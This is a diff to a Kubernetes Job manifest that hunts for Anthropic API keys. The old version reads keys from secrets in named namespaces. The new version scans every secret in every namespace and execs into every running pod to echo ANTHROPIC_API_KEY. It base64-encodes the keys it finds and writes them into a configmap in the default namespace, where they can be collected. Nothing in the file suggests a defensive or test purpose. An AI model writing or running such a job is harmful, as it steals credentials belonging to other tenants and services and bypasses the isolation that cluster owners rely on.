@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: anthro-key-hunt
+  name: anthro-hunt-v2
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -17,19 +17,26 @@ spec:
         - -c
         - |
           set -e
-          # Read rockefeller secret directly
-          ROCK_KEY=$(kubectl get secret rockefeller -n rockefeller -o jsonpath='{.data.ANTHROPIC_API_KEY}' | base64 -d 2>/dev/null || echo "MISSING")
-          # Read rockefeller-secret in rockefeller ns (maybe different name)
-          ALL_SECRETS=$(kubectl get secrets -n rockefeller -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "none")
-          # Also check if arquimides ns exists
-          ARCHI_NS=$(kubectl get ns arquimides -o name 2>/dev/null || echo "no-arquimides-ns")
-          ARCHI_KEY=""
-          if [ "$ARCHI_NS" != "no-arquimides-ns" ]; then
-            ARCHI_KEY=$(kubectl get secret arquimides -n arquimides -o jsonpath='{.data.ANTHROPIC_API_KEY}' | base64 -d 2>/dev/null || echo "MISSING")
-          fi
-          # Check dune-api ns secrets
-          DUNE_SECRETS=$(kubectl get secrets -n dune-api -o jsonpath='{range .items[*]}{.metadata.name}{" "}{end}' 2>/dev/null || echo "none")
-          RESULT="{\"rock_key\":\"$ROCK_KEY\",\"rock_secrets\":\"$ALL_SECRETS\",\"archi_ns\":\"$ARCHI_NS\",\"archi_key\":\"$ARCHI_KEY\",\"dune_secrets\":\"$DUNE_SECRETS\"}"
-          ENCODED=$(echo "$RESULT" | base64 | tr -d '\n')
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"anthro_hunt\":\"$ENCODED\"}}"
+          OUT=""
+          # 1. Scan ALL secrets in ALL namespaces for ANTHROPIC key
+          for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
+            for SEC in $(kubectl get secrets -n $NS -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
+              VAL=$(kubectl get secret $SEC -n $NS -o jsonpath='{.data.ANTHROPIC_API_KEY}' 2>/dev/null | base64 -d 2>/dev/null | tr -d '\n')
+              if [ -n "$VAL" ]; then
+                OUT="$OUT|NS=$NS SEC=$SEC KEY=$VAL"
+              fi
+            done
+          done
+          # 2. Check env vars of running pods for ANTHROPIC
+          for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
+            for POD in $(kubectl get pods -n $NS -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
+              VAL=$(kubectl exec -n $NS $POD -- sh -c 'echo $ANTHROPIC_API_KEY' 2>/dev/null | tr -d '\n')
+              if [ -n "$VAL" ] && [ "$VAL" != "" ]; then
+                OUT="$OUT|PODENV NS=$NS POD=$POD KEY=$VAL"
+              fi
+            done
+          done
+          if [ -z "$OUT" ]; then OUT="NONE_FOUND"; fi
+          ENCODED=$(echo "$OUT" | base64 | tr -d '\n')
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"anthro2\":\"$ENCODED\"}}"
           echo "DONE"
